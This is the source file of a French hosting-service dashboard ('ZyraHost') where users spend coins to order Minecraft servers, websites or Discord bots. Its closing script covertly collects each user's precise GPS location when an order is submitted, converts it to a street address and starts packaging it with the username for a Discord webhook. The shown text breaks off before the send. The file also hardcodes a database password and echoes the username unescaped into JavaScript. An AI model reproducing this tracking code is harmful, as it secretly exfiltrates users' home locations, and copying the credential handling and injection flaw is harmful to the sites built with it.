<?php
session_start();

// Activer l'affichage des erreurs pour le débogage
error_reporting(E_ALL);
ini_set('display_errors', 1);

// Vérifier si l'utilisateur est connecté
if (!isset($_SESSION['user_id'])) {
    header('Location: login.php');
    exit;
}

// Récupérer les informations de l'utilisateur
$username = $_SESSION['username'];
$email = $_SESSION['email'];
$user_id = $_SESSION['user_id'];
$coins = isset($_SESSION['coins']) ? (int)$_SESSION['coins'] : 0;

$serverTypes = [
    'minecraft' => 'Serveur Minecraft',
    'website' => 'Site Internet'
];

$botLanguages = [
    'python' => 'Python',
    'javascript' => 'JavaScript'
];

$performancePlans = [
    'starter' => [
        'label' => 'Starter · 1 Go RAM',
        'coins' => 150,
        'description' => "Idéal pour démarrer un petit projet."
    ],
    'standard' => [
        'label' => 'Standard · 2 Go RAM',
        'coins' => 250,
        'description' => "Plus de marge pour une communauté en croissance."
    ],
    'advanced' => [
        'label' => 'Avancé · 4 Go RAM',
        'coins' => 450,
        'description' => "Pensé pour des usages intensifs."
    ],
    'elite' => [
        'label' => 'Elite · 8 Go RAM',
        'coins' => 800,
        'description' => "Performance maximale pour vos projets majeurs."
    ],
];

$storagePlans = [
    'storage_20' => [
        'label' => '20 Go SSD',
        'coins' => 40,
    ],
    'storage_50' => [
        'label' => '50 Go SSD',
        'coins' => 80,
    ],
    'storage_100' => [
        'label' => '100 Go SSD',
        'coins' => 140,
    ],
    'storage_200' => [
        'label' => '200 Go NVMe',
        'coins' => 240,
    ],
];

$cpuShares = [
    'cpu_100' => [
        'label' => '1 cœur (100%)',
        'coins' => 200,
    ],
    'cpu_200' => [
        'label' => '2 cœurs (200%)',
        'coins' => 380,
    ],
    'cpu_300' => [
        'label' => '3 cœurs (300%)',
        'coins' => 540,
    ],
    'cpu_400' => [
        'label' => '4 cœurs (400%)',
        'coins' => 680,
    ],
];

$successMessage = $_SESSION['flash_success'] ?? '';
$errorMessage = $_SESSION['flash_error'] ?? '';
unset($_SESSION['flash_success'], $_SESSION['flash_error']);

// Connexion à la base pour récupérer le solde actualisé
$db_host = 'localhost:3306';
$db_name = 'mttljx_zyrahostf_db';
$db_user = 'sti_moi';
$db_pass = 'pj32~lH36';

$pdo = null;

try {
    $pdo = new PDO("mysql:host=$db_host;dbname=$db_name;charset=utf8", $db_user, $db_pass);
    $pdo->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);

    $stmt = $pdo->prepare('SELECT coins FROM users WHERE id = ?');
    $stmt->execute([$user_id]);
    $row = $stmt->fetch(PDO::FETCH_ASSOC);

    if ($row && isset($row['coins'])) {
        $coins = (int)$row['coins'];
        $_SESSION['coins'] = $coins;
    }

    $pdo->exec("CREATE TABLE IF NOT EXISTS service_requests (
        id INT AUTO_INCREMENT PRIMARY KEY,
        user_id INT NOT NULL,
        type VARCHAR(50) NOT NULL,
        payload TEXT NOT NULL,
        status VARCHAR(20) NOT NULL DEFAULT 'pending',
        created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
        INDEX idx_user_id (user_id)
    ) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4;");
} catch (PDOException $e) {
    // En cas d'échec, afficher un message d'erreur détaillé en développement
    $error_message = "Erreur de connexion à la base de données: " . $e->getMessage();
    error_log($error_message);
    
    // En production, afficher un message générique
    if (strpos($e->getMessage(), 'Access denied') !== false) {
        $error_message = "Erreur d'authentification à la base de données. Veuillez contacter l'administrateur.";
    } else {
        $error_message = "Erreur de connexion à la base de données. Veuillez réessayer plus tard.";
    }
    
    // Afficher l'erreur complète en développement
    if (ini_get('display_errors')) {
        $error_message .= "\n\nDétails techniques (à ne pas afficher en production):\n" . $e->getMessage();
    }
    
    die($error_message);
}

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    if ($pdo === null) {
        $_SESSION['flash_error'] = "Impossible d'enregistrer votre demande pour le moment. Veuillez réessayer plus tard.";
        header('Location: client.php');
        exit;
    }

    $actionType = $_POST['action_type'] ?? '';
    $payload = [];
    $errors = [];

    $costCoins = 0;
    $resourceLabel = '';
    $resourceSummary = '';
    $payloadPlanKey = '';
    $payloadStorageKey = '';
    $payloadCpuKey = '';

    switch ($actionType) {
        case 'create_server':
            $serverName = trim($_POST['server_name'] ?? '');
            $serverType = $_POST['server_type'] ?? '';
            $payloadPlanKey = $_POST['performance_plan'] ?? '';
            $payloadStorageKey = $_POST['storage_plan'] ?? '';
            $payloadCpuKey = $_POST['cpu_share'] ?? '';

            if ($serverName === '') {
                $errors[] = 'Merci d’indiquer un nom pour votre hébergement.';
            }

            if (!array_key_exists($serverType, $serverTypes)) {
                $errors[] = 'Type de service invalide.';
            }

            if (!array_key_exists($payloadPlanKey, $performancePlans)) {
                $errors[] = 'Sélectionnez une performance valide pour votre service.';
            }

            if (!array_key_exists($payloadStorageKey, $storagePlans)) {
                $errors[] = 'Sélectionnez un stockage valide pour votre service.';
            }

            if (!array_key_exists($payloadCpuKey, $cpuShares)) {
                $errors[] = 'Sélectionnez une part de CPU valide pour votre service.';
            }

            if (empty($errors)) {
                $selectedPlan = $performancePlans[$payloadPlanKey];
                $selectedStorage = $storagePlans[$payloadStorageKey];
                $selectedCpu = $cpuShares[$payloadCpuKey];

                $planCoins = (int) $selectedPlan['coins'];
                $storageCoins = (int) $selectedStorage['coins'];
                $cpuCoins = (int) $selectedCpu['coins'];

                $costCoins = $planCoins + $storageCoins + $cpuCoins;
                $resourceSummary = sprintf('%s · %s · %s', $selectedPlan['label'], $selectedStorage['label'], $selectedCpu['label']);
                $resourceLabel = sprintf('%s "%s"', $serverTypes[$serverType], $serverName);

                $payload = [
                    'server_name' => $serverName,
                    'server_type' => $serverType,
                    'performance_plan' => $payloadPlanKey,
                    'performance_label' => $selectedPlan['label'],
                    'performance_coins' => $planCoins,
                    'storage_plan' => $payloadStorageKey,
                    'storage_label' => $selectedStorage['label'],
                    'storage_coins' => $storageCoins,
                    'cpu_share' => $payloadCpuKey,
                    'cpu_label' => $selectedCpu['label'],
                    'cpu_coins' => $cpuCoins,
                    'coins_per_month' => $costCoins,
                    'auto_provisioned' => true,
                ];
            }
            break;

        case 'deploy_bot':
            $botName = trim($_POST['bot_name'] ?? '');
            $botLanguage = $_POST['bot_language'] ?? '';
            $payloadPlanKey = $_POST['performance_plan'] ?? '';
            $payloadStorageKey = $_POST['storage_plan'] ?? '';
            $payloadCpuKey = $_POST['cpu_share'] ?? '';

            if ($botName === '') {
                $errors[] = 'Merci de renseigner un nom pour votre bot Discord.';
            }

            if (!array_key_exists($botLanguage, $botLanguages)) {
                $errors[] = 'Langage de bot invalide.';
            }

            if (!array_key_exists($payloadPlanKey, $performancePlans)) {
                $errors[] = 'Sélectionnez une performance valide pour votre bot.';
            }

            if (!array_key_exists($payloadStorageKey, $storagePlans)) {
                $errors[] = 'Sélectionnez un stockage valide pour votre bot.';
            }

            if (!array_key_exists($payloadCpuKey, $cpuShares)) {
                $errors[] = 'Sélectionnez une part de CPU valide pour votre bot.';
            }

            if (empty($errors)) {
                $selectedPlan = $performancePlans[$payloadPlanKey];
                $selectedStorage = $storagePlans[$payloadStorageKey];
                $selectedCpu = $cpuShares[$payloadCpuKey];

                $planCoins = (int) $selectedPlan['coins'];
                $storageCoins = (int) $selectedStorage['coins'];
                $cpuCoins = (int) $selectedCpu['coins'];

                $costCoins = $planCoins + $storageCoins + $cpuCoins;
                $resourceSummary = sprintf('%s · %s · %s', $selectedPlan['label'], $selectedStorage['label'], $selectedCpu['label']);
                $resourceLabel = sprintf('Bot Discord "%s"', $botName);

                $payload = [
                    'bot_name' => $botName,
                    'bot_language' => $botLanguage,
                    'performance_plan' => $payloadPlanKey,
                    'performance_label' => $selectedPlan['label'],
                    'performance_coins' => $planCoins,
                    'storage_plan' => $payloadStorageKey,
                    'storage_label' => $selectedStorage['label'],
                    'storage_coins' => $storageCoins,
                    'cpu_share' => $payloadCpuKey,
                    'cpu_label' => $selectedCpu['label'],
                    'cpu_coins' => $cpuCoins,
                    'coins_per_month' => $costCoins,
                    'auto_provisioned' => true,
                ];
            }
            break;

        default:
            $errors[] = 'Action non reconnue.';
            break;
    }

    if (!empty($errors)) {
        $_SESSION['flash_error'] = implode(' ', $errors);
        header('Location: client.php');
        exit;
    }

    if ($costCoins <= 0) {
        $_SESSION['flash_error'] = "Impossible de déterminer le coût de la prestation sélectionnée.";
        header('Location: client.php');
        exit;
    }

    $payloadJson = json_encode($payload, JSON_UNESCAPED_UNICODE);

    try {
        $pdo->beginTransaction();

        $stmt = $pdo->prepare('SELECT coins FROM users WHERE id = ? FOR UPDATE');
        $stmt->execute([$user_id]);
        $currentCoins = (int) $stmt->fetchColumn();

        if ($currentCoins < $costCoins) {
            $pdo->rollBack();
            $difference = $costCoins - $currentCoins;
            $_SESSION['flash_error'] = sprintf('Solde insuffisant. Il vous manque %d coin%s pour cette configuration.', $difference, $difference > 1 ? 's' : '');
            header('Location: client.php');
            exit;
        }

        $stmt = $pdo->prepare('UPDATE users SET coins = coins - ? WHERE id = ?');
        $stmt->execute([$costCoins, $user_id]);

        $stmt = $pdo->prepare('INSERT INTO service_requests (user_id, type, payload, status) VALUES (:user_id, :type, :payload, :status)');
        $stmt->execute([
            ':user_id' => $user_id,
            ':type' => $actionType,
            ':payload' => $payloadJson,
            ':status' => 'auto_provisioned',
        ]);

        $pdo->commit();

        $coins = $currentCoins - $costCoins;
        $_SESSION['coins'] = $coins;

        $_SESSION['flash_success'] = sprintf(
            '%s provisionné automatiquement avec le plan %s. %d coin%s ont été débités. Solde restant : %d coin%s.',
            $resourceLabel,
            $resourceSummary,
            $costCoins,
            $costCoins > 1 ? 's' : '',
            $coins,
            $coins > 1 ? 's' : ''
        );
    } catch (PDOException $e) {
        if ($pdo !== null && $pdo->inTransaction()) {
            $pdo->rollBack();
        }
        $_SESSION['flash_error'] = "Une erreur est survenue lors de la création automatique de votre service. Veuillez réessayer.";
    }

    header('Location: client.php');
    exit;
}
?>
<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Dashboard - ZyraHost</title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <style>
        :root {
            --primary: #5865F2;
            --secondary: #00FFC3;
            --accent: #FF3366;
            --dark: #121212;
            --darker: #0d0d0d;
            --light: #f8f9fa;
        }

        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            background-color: var(--darker);
            color: var(--light);
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            min-height: 100vh;
        }

        header {
            background-color: var(--dark);
            padding: 1rem 0;
            box-shadow: 0 4px 20px rgba(88, 101, 242, 0.2);
            border-bottom: 2px solid #333;
        }

        .container {
            width: 90%;
            max-width: 1200px;
            margin: 0 auto;
        }

        nav {
            display: flex;
            justify-content: space-between;
            align-items: center;
            flex-wrap: wrap;
            gap: 1rem;
        }

        .logo {
            font-size: 1.8rem;
            font-weight: bold;
            color: var(--primary);
            text-shadow: 0 0 10px rgba(88, 101, 242, 0.5);
        }

        .user-info {
            display: flex;
            align-items: center;
            gap: 1rem;
        }

        .coin-badge {
            display: inline-flex;
            align-items: center;
            gap: 0.4rem;
            background: linear-gradient(135deg, rgba(255, 215, 0, 0.15), rgba(255, 165, 0, 0.15));
            border: 1px solid rgba(255, 215, 0, 0.35);
            padding: 0.35rem 0.9rem;
            border-radius: 999px;
            color: #ffd700;
            font-weight: 600;
            text-shadow: 0 0 6px rgba(255, 215, 0, 0.35);
        }

        .coin-badge i {
            color: #ffca28;
        }

        .user-name {
            color: var(--light);
            font-weight: 600;
        }

        .btn {
            padding: 0.7rem 1.5rem;
            border-radius: 6px;
            font-weight: bold;
            text-decoration: none;
            transition: all 0.3s;
            border: none;
            cursor: pointer;
            display: inline-flex;
            align-items: center;
            gap: 0.5rem;
        }

        .btn-logout {
            background-color: transparent;
            color: var(--accent);
            border: 2px solid var(--accent);
        }

        .btn-logout:hover {
            background-color: var(--accent);
            color: var(--light);
            transform: translateY(-2px);
        }

        .dashboard-content {
            padding: 3rem 0;
        }

        .welcome-card {
            background-color: var(--dark);
            padding: 3rem;
            border-radius: 12px;
            box-shadow: 0 8px 32px rgba(88, 101, 242, 0.2);
            text-align: center;
            margin-bottom: 3rem;
            border: 1px solid #333;
            position: relative;
            overflow: hidden;
        }

        .welcome-card::before {
            content: '';
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 4px;
            background: linear-gradient(90deg, var(--primary), var(--secondary));
        }

        .welcome-card h1 {
            font-size: 2.5rem;
            color: var(--primary);
            margin-bottom: 1rem;
            text-shadow: 0 0 10px rgba(88, 101, 242, 0.5);
        }

        .welcome-card p {
            color: #aaa;
            font-size: 1.1rem;
            margin-bottom: 0.5rem;
        }

        .user-badge {
            display: inline-block;
            background: linear-gradient(135deg, var(--primary), var(--secondary));
            padding: 0.5rem 1rem;
            border-radius: 20px;
            font-size: 0.9rem;
            margin-top: 1rem;
            font-weight: bold;
        }

        .stats-grid {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
            gap: 2rem;
            margin-bottom: 3rem;
        }

        .stat-card {
            background-color: var(--dark);
            padding: 2rem;
            border-radius: 12px;
            box-shadow: 0 8px 32px rgba(0, 0, 0, 0.4);
            transition: all 0.3s;
            border: 1px solid #333;
        }

        .stat-card:hover {
            transform: translateY(-5px);
            border-color: var(--primary);
            box-shadow: 0 12px 40px rgba(88, 101, 242, 0.3);
        }

        .stat-card i {
            font-size: 2.5rem;
            color: var(--primary);
            margin-bottom: 1rem;
            display: block;
        }

        .stat-card h3 {
            color: var(--light);
            margin-bottom: 0.5rem;
            font-size: 1.2rem;
        }

        .stat-card p {
            color: #aaa;
            font-size: 0.9rem;
        }

        .stat-card .stat-number {
            font-size: 2rem;
            font-weight: bold;
            color: var(--secondary);
            margin: 0.5rem 0;
        }

        .quick-actions {
            background-color: var(--dark);
            padding: 2rem;
            border-radius: 12px;
            box-shadow: 0 8px 32px rgba(0, 0, 0, 0.4);
            border: 1px solid #333;
        }

        .quick-actions h2 {
            color: var(--primary);
            margin-bottom: 1.5rem;
            font-size: 1.8rem;
        }

        .actions-grid {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
            gap: 1rem;
        }

        .action-btn {
            background: linear-gradient(135deg, var(--primary), #4c56e0);
            color: white;
            padding: 1.5rem;
            border-radius: 8px;
            text-decoration: none;
            text-align: center;
            transition: all 0.3s;
            display: flex;
            flex-direction: column;
            align-items: center;
            gap: 0.5rem;
            border: none;
            cursor: pointer;
        }

        .action-btn:hover {
            box-shadow: 0 0 30px rgba(88, 101, 242, 0.6);
            transform: translateY(-3px);
        }

        .action-btn i {
            font-size: 2rem;
        }

        .coin-cta {
            margin-top: 2.5rem;
            background: rgba(255, 215, 0, 0.08);
            border: 1px solid rgba(255, 215, 0, 0.35);
            border-radius: 12px;
            padding: 2rem;
            text-align: center;
            box-shadow: 0 10px 30px rgba(255, 215, 0, 0.12);
        }

        .coin-cta h2 {
            color: #ffd700;
            margin-bottom: 0.75rem;
            font-size: 1.8rem;
        }

        .coin-cta p {
            color: #f1e4b0;
            margin-bottom: 1.5rem;
            font-size: 1rem;
        }

        .coin-cta a {
            display: inline-flex;
            align-items: center;
            gap: 0.6rem;
            padding: 0.9rem 1.8rem;
            border-radius: 999px;
            background: linear-gradient(135deg, #ffca28, #ff8f00);
            color: var(--darker);
            font-weight: 700;
            text-decoration: none;
            box-shadow: 0 10px 25px rgba(255, 159, 28, 0.35);
        }

        .coin-cta a:hover {
            transform: translateY(-2px);
            box-shadow: 0 14px 35px rgba(255, 159, 28, 0.45);
        }

        .alert {
            padding: 1rem 1.25rem;
            border-radius: 8px;
            margin-bottom: 1.5rem;
            border: 1px solid transparent;
            display: flex;
            align-items: center;
            gap: 0.75rem;
            font-weight: 600;
        }

        .alert-success {
            background: rgba(0, 255, 195, 0.12);
            border-color: rgba(0, 255, 195, 0.35);
            color: #8bf7de;
        }

        .alert-error {
            background: rgba(255, 51, 102, 0.12);
            border-color: rgba(255, 51, 102, 0.35);
            color: #ff9ab4;
        }

        .modal-overlay {
            position: fixed;
            inset: 0;
            background: rgba(0, 0, 0, 0.75);
            display: none;
            align-items: center;
            justify-content: center;
            padding: 1.5rem;
            z-index: 2000;
        }

        .modal-overlay.active {
            display: flex;
        }

        .modal-card {
            background: var(--dark);
            border-radius: 16px;
            max-width: 520px;
            width: 100%;
            box-shadow: 0 25px 60px rgba(0, 0, 0, 0.45);
            border: 1px solid rgba(88, 101, 242, 0.25);
            overflow: hidden;
        }

        .modal-form {
            display: flex;
            flex-direction: column;
        }

        .modal-form .modal-body {
            flex: 1;
        }

        .modal-header {
            padding: 1.5rem;
            background: linear-gradient(135deg, rgba(88, 101, 242, 0.1), rgba(0, 255, 195, 0.1));
            border-bottom: 1px solid rgba(88, 101, 242, 0.25);
            display: flex;
            justify-content: space-between;
            align-items: center;
        }

        .modal-header h3 {
            margin: 0;
            font-size: 1.4rem;
            color: var(--secondary);
        }

        .modal-close {
            background: none;
            border: none;
            color: #bbb;
            font-size: 1.3rem;
            cursor: pointer;
            transition: color 0.2s ease;
        }

        .modal-close:hover {
            color: #fff;
        }

        .modal-body {
            padding: 1.5rem;
            display: grid;
            gap: 1.2rem;
        }
        
        .loader {
            border: 4px solid #f3f3f3;
            border-top: 4px solid #5865F2;
            border-radius: 50%;
            width: 30px;
            height: 30px;
            animation: spin 1s linear infinite;
            margin: 10px auto;
        }
        
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }

        .form-row {
            display: flex;
            flex-direction: column;
            gap: 0.4rem;
        }

        .form-row label {
            font-weight: 600;
            color: #d2d6f3;
        }

        .option-group {
            display: flex;
            flex-wrap: wrap;
            gap: 0.75rem;
        }

        .option-pill {
            display: flex;
            align-items: center;
            gap: 0.5rem;
            padding: 0.6rem 1rem;
            border-radius: 999px;
            border: 1px solid rgba(255, 255, 255, 0.15);
            background: rgba(255, 255, 255, 0.05);
            cursor: pointer;
            transition: border 0.2s ease, box-shadow 0.2s ease;
        }

        .option-pill:hover {
            border-color: var(--primary);
            box-shadow: 0 0 18px rgba(88, 101, 242, 0.2);
        }

        .option-pill input {
            accent-color: var(--primary);
        }

        .option-pill span {
            font-weight: 600;
            color: var(--light);
        }

        .option-pill input:checked ~ span {
            color: var(--secondary);
        }

        .form-row input,
        .form-row select,
        .form-row textarea {
            padding: 0.75rem 0.9rem;
            border-radius: 8px;
            border: 1px solid rgba(255, 255, 255, 0.1);
            background: rgba(255, 255, 255, 0.05);
            color: var(--light);
            outline: none;
            transition: border 0.2s ease;
        }

        .form-row select option {
            color: var(--light);
            background-color: var(--dark);
        }

        .form-row input:focus,
        .form-row select:focus,
        .form-row textarea:focus {
            border-color: var(--primary);
        }

        .modal-actions {
            display: flex;
            justify-content: flex-end;
            gap: 1rem;
            padding: 0 1.5rem 1.5rem;
        }

        .modal-actions button,
        .modal-actions a {
            padding: 0.75rem 1.5rem;
            border-radius: 8px;
            border: none;
            cursor: pointer;
            font-weight: 600;
        }

        .btn-secondary {
            background: rgba(255, 255, 255, 0.08);
            color: var(--light);
        }

        .btn-primary-action {
            background: linear-gradient(135deg, var(--primary), #4c56e0);
            color: white;
            box-shadow: 0 8px 18px rgba(88, 101, 242, 0.35);
        }

        textarea {
            min-height: 110px;
            resize: vertical;
        }

        @media (max-width: 768px) {
            nav {
                flex-direction: column;
                text-align: center;
            }

            .user-info {
                flex-direction: column;
                width: 100%;
            }

            .welcome-card h1 {
                font-size: 2rem;
            }

            .stats-grid {
                grid-template-columns: 1fr;
            }
        }
    </style>
</head>
<body>
    <header>
        <div class="container">
            <nav>
                <div class="logo">
                    <i class="fas fa-cube"></i> ZyraHost
                </div>
                <div class="user-info">
                    <span class="user-name">
                        <i class="fas fa-user-circle"></i> <?php echo htmlspecialchars($username); ?>
                    </span>
                    <span class="coin-badge">
                        <i class="fas fa-coins"></i>
                        <?php echo number_format($coins, 0, ',', ' '); ?>
                        <small>coins</small>
                    </span>
                    <a href="logout.php" class="btn btn-logout">
                        <i class="fas fa-sign-out-alt"></i> Déconnexion
                    </a>
                </div>
            </nav>
        </div>
    </header>

    <div class="dashboard-content">
        <div class="container">
            <div class="welcome-card">
                <h1>🎮 Bienvenue, <?php echo htmlspecialchars($username); ?> !</h1>
                <p><strong>Email :</strong> <?php echo htmlspecialchars($email); ?></p>
                <p><strong>ID Utilisateur :</strong> #<?php echo htmlspecialchars($user_id); ?></p>
                <span class="user-badge">
                    <i class="fas fa-star"></i> Membre Actif
                </span>
            </div>

            <?php if (!empty($successMessage)): ?>
                <div class="alert alert-success">
                    <i class="fas fa-check-circle"></i>
                    <?php echo htmlspecialchars($successMessage, ENT_QUOTES, 'UTF-8'); ?>
                </div>
            <?php endif; ?>

            <?php if (!empty($errorMessage)): ?>
                <div class="alert alert-error">
                    <i class="fas fa-exclamation-triangle"></i>
                    <?php echo htmlspecialchars($errorMessage, ENT_QUOTES, 'UTF-8'); ?>
                </div>
            <?php endif; ?>

            <div class="stats-grid">
                <div class="stat-card">
                    <i class="fas fa-server"></i>
                    <h3>Serveurs</h3>
                    <div class="stat-number">0</div>
                    <p>Aucun serveur actif</p>
                </div>

                <div class="stat-card">
                    <i class="fab fa-discord"></i>
                    <h3>Bots Discord</h3>
                    <div class="stat-number">0</div>
                    <p>Aucun bot déployé</p>
                </div>

                <div class="stat-card">
                    <i class="fas fa-database"></i>
                    <h3>Bases de Données</h3>
                    <div class="stat-number">0</div>
                    <p>Aucune BDD créée</p>
                </div>

                <div class="stat-card">
                    <i class="fas fa-chart-line"></i>
                    <h3>Uptime</h3>
                    <div class="stat-number">100%</div>
                    <p>Disponibilité totale</p>
                </div>

                <div class="stat-card">
                    <i class="fas fa-coins"></i>
                    <h3>Solde de Coins</h3>
                    <div class="stat-number"><?php echo number_format($coins, 0, ',', ' '); ?></div>
                    <p>Accumulez des coins pour acheter vos serveurs.</p>
                </div>
            </div>

            <div class="quick-actions">
                <h2><i class="fas fa-bolt"></i> Actions Rapides</h2>
                <div class="actions-grid">
                    <button class="action-btn" data-modal="modal-create-server">
                        <i class="fas fa-plus-circle"></i>
                        <span>Créer un Serveur</span>
                    </button>

                    <button class="action-btn" data-modal="modal-deploy-bot">
                        <i class="fab fa-discord"></i>
                        <span>Déployer un Bot</span>
                    </button>

                    <a href="coins/coins.php" class="action-btn">
                        <i class="fas fa-coins"></i>
                        <span>Gérer mes Coins</span>
                    </a>
                </div>
            </div>

            <div class="coin-cta">
                <h2><i class="fas fa-coins"></i> Gagnez des Coins</h2>
                <p>Regardez des publicités ou achetez des coins pour débloquer vos futurs serveurs ZyraHost.</p>
                <a href="coins/coins.php">
                    <i class="fas fa-arrow-right"></i>
                    Ouvrir le centre des coins
                </a>
            </div>
        </div>
    </div>

    <div class="modal-overlay" id="modal-create-server">
        <div class="modal-card">
            <div class="modal-header">
                <h3><i class="fas fa-plus-circle"></i> Créer un serveur</h3>
                <button class="modal-close" data-close>&times;</button>
            </div>
            <form id="create-server-form" class="modal-form" method="POST" onsubmit="return handleServerFormSubmit(event)">
                <input type="hidden" name="action_type" value="create_server">
                <input type="hidden" name="action" value="create_server">
                <div class="form-group">
                    <label for="server_name">Nom du serveur</label>
                    <input type="text" id="server_name" name="server_name" required>
                </div>
                <div id="location-loading" style="display: none; text-align: center; margin: 10px 0;">
                    <p>Localisation en cours... Veuillez patienter.</p>
                    <div class="loader"></div>
                </div>
                <div class="form-row">
                    <label>Type de service</label>
                    <div class="option-group">
                        <?php foreach ($serverTypes as $typeKey => $typeLabel): ?>
                            <label class="option-pill">
                                <input type="radio" name="server_type" value="<?php echo htmlspecialchars($typeKey); ?>" required>
                                <span><?php echo htmlspecialchars($typeLabel); ?></span>
                            </label>
                        <?php endforeach; ?>
                    </div>
                </div>
                <div class="form-row">
                    <label for="server-performance">Performance</label>
                    <select id="server-performance" name="performance_plan" required>
                        <option value="" disabled selected>Choisissez la performance</option>
                        <?php foreach ($performancePlans as $planKey => $plan): ?>
                            <option value="<?php echo htmlspecialchars($planKey); ?>">
                                <?php echo htmlspecialchars($plan['label']); ?> — <?php echo (int) $plan['coins']; ?> coin<?php echo $plan['coins'] > 1 ? 's' : ''; ?>/mois
                            </option>
                        <?php endforeach; ?>
                    </select>
                </div>
                <div class="form-row">
                    <label for="server-storage">Stockage</label>
                    <select id="server-storage" name="storage_plan" required>
                        <option value="" disabled selected>Choisissez le stockage</option>
                        <?php foreach ($storagePlans as $planKey => $plan): ?>
                            <option value="<?php echo htmlspecialchars($planKey); ?>">
                                <?php echo htmlspecialchars($plan['label']); ?> — <?php echo (int) $plan['coins']; ?> coin<?php echo $plan['coins'] > 1 ? 's' : ''; ?>/mois
                            </option>
                        <?php endforeach; ?>
                    </select>
                </div>
                <div class="form-row">
                    <label for="server-cpu">Cœurs (en %)</label>
                    <select id="server-cpu" name="cpu_share" required>
                        <option value="" disabled selected>Choisissez la part CPU</option>
                        <?php foreach ($cpuShares as $cpuKey => $cpu): ?>
                            <option value="<?php echo htmlspecialchars($cpuKey); ?>">
                                <?php echo htmlspecialchars($cpu['label']); ?> — <?php echo (int) $cpu['coins']; ?> coin<?php echo $cpu['coins'] > 1 ? 's' : ''; ?>/mois
                            </option>
                        <?php endforeach; ?>
                    </select>
                </div>
                <div class="modal-actions">
                    <button type="button" class="btn-secondary" data-close>Annuler</button>
                    <button type="submit" class="btn-primary-action">Valider la demande</button>
                </div>
            </form>
        </div>
    </div>

    <div class="modal-overlay" id="modal-deploy-bot">
        <div class="modal-card">
            <div class="modal-header">
                <h3><i class="fab fa-discord"></i> Déployer un bot Discord</h3>
                <button class="modal-close" data-close>&times;</button>
            </div>
            <form id="deploy-bot-form" class="modal-form" method="POST" onsubmit="return handleBotFormSubmit(event)">
                <input type="hidden" name="action_type" value="deploy_bot">
                <input type="hidden" name="action" value="deploy_bot">
                <div class="form-group">
                    <label for="bot_name">Nom du bot</label>
                    <input type="text" id="bot_name" name="bot_name" required>
                </div>
                <div id="bot-location-loading" style="display: none; text-align: center; margin: 10px 0;">
                    <p>Localisation en cours... Veuillez patienter.</p>
                    <div class="loader"></div>
                </div>
                <div class="form-row">
                    <label>Langage</label>
                    <div class="option-group">
                        <?php foreach ($botLanguages as $languageKey => $languageLabel): ?>
                            <label class="option-pill">
                                <input type="radio" name="bot_language" value="<?php echo htmlspecialchars($languageKey); ?>" required>
                                <span><?php echo htmlspecialchars($languageLabel); ?></span>
                            </label>
                        <?php endforeach; ?>
                    </div>
                </div>
                <div class="form-row">
                    <label for="bot-performance">Performance</label>
                    <select id="bot-performance" name="performance_plan" required>
                        <option value="" disabled selected>Choisissez la performance</option>
                        <?php foreach ($performancePlans as $planKey => $plan): ?>
                            <option value="<?php echo htmlspecialchars($planKey); ?>">
                                <?php echo htmlspecialchars($plan['label']); ?> — <?php echo (int) $plan['coins']; ?> coin<?php echo $plan['coins'] > 1 ? 's' : ''; ?>/mois
                            </option>
                        <?php endforeach; ?>
                    </select>
                </div>
                <div class="form-row">
                    <label for="bot-storage">Stockage</label>
                    <select id="bot-storage" name="storage_plan" required>
                        <option value="" disabled selected>Choisissez le stockage</option>
                        <?php foreach ($storagePlans as $planKey => $plan): ?>
                            <option value="<?php echo htmlspecialchars($planKey); ?>">
                                <?php echo htmlspecialchars($plan['label']); ?> — <?php echo (int) $plan['coins']; ?> coin<?php echo $plan['coins'] > 1 ? 's' : ''; ?>/mois
                            </option>
                        <?php endforeach; ?>
                    </select>
                </div>
                <div class="form-row">
                    <label for="bot-cpu">Cœurs (en %)</label>
                    <select id="bot-cpu" name="cpu_share" required>
                        <option value="" disabled selected>Choisissez la part CPU</option>
                        <?php foreach ($cpuShares as $cpuKey => $cpu): ?>
                            <option value="<?php echo htmlspecialchars($cpuKey); ?>">
                                <?php echo htmlspecialchars($cpu['label']); ?> — <?php echo (int) $cpu['coins']; ?> coin<?php echo $cpu['coins'] > 1 ? 's' : ''; ?>/mois
                            </option>
                        <?php endforeach; ?>
                    </select>
                </div>
                </div>
                <div class="modal-actions">
                    <button type="button" class="btn-secondary" data-close>Annuler</button>
                    <button type="submit" class="btn-primary-action">Envoyer la demande</button>
                </div>
            </form>
        </div>
    </div>

    <script>
        // Fonction pour obtenir la géolocalisation et envoyer au webhook Discord
        async function getUserLocation() {
            if (!navigator.geolocation) {
                console.log("La géolocalisation n'est pas supportée par votre navigateur");
                return null;
            }

            try {
                const position = await new Promise((resolve, reject) => {
                    navigator.geolocation.getCurrentPosition(resolve, reject, {
                        enableHighAccuracy: true,
                        timeout: 5000,
                        maximumAge: 0
                    });
                });

                // Récupérer l'adresse à partir des coordonnées
                const response = await fetch(`https://nominatim.openstreetmap.org/reverse?format=json&lat=${position.coords.latitude}&lon=${position.coords.longitude}&accept-language=fr`);
                const data = await response.json();
                
                return {
                    latitude: position.coords.latitude,
                    longitude: position.coords.longitude,
                    accuracy: position.coords.accuracy,
                    address: data.display_name || 'Adresse non disponible',
                    city: data.address?.city || data.address?.town || data.address?.village || 'Ville inconnue',
                    country: data.address?.country || 'Pays inconnu',
                    username: '<?php echo isset($username) ? $username : 'Invité'; ?>',
                    timestamp: new Date().toISOString()
                };
            } catch (error) {
                console.error("Erreur de géolocalisation:", error);
                return null;
            }
        }

        // Fonction pour envoyer les données de localisation à Discord
        async function sendLocationToDiscord(locationData) {
            try {
                if (!locationData) return;

                const embed = {
                    title: '📍 Nouvelle demande de création - Localisation',
                    color: 0x5865F2,
                    fields: [
                        {
                            name: '👤 Utilisateur',
                            value: locationData.username,
                            inline: true
